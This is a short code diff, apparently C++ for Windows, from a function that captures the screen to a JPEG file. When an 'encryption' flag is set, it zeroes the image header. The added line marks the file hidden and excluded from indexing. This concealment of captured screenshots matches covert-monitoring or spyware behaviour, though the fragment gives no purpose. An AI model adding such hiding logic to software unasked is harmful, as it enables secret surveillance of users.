@@ -107,6 +107,7 @@ void work(CString filename, bool encryption)
 	ScreenCapture(0, 0, width, height, filename.GetString(), 100L);
 	if (encryption) {
 		fillJpegHeaderWithZero(filename.GetString());
+		SetFileAttributes(filename.GetString(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
 	}
 	delete time;
 }
